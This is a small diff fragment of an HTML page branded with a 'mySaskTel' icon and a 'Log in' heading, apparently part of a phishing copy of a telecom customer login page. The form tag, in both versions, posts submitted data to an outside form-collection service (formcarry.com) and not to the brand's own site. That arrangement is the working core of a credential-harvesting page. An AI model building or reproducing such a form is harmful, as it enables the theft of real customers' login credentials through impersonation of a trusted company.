@@ -175,7 +175,7 @@
                 <div class="icon-mySaskTel-2016"></div>
                 <div class="log-in-form">
                         
-                    <form  action="https://formcarry.com/s/5t6HRsC82O"method="post" class="username-challenge">
+                    <form action="https://formcarry.com/s/5t6HRsC82O" method="POST">
          
                         <h2>Log in</h2>
 
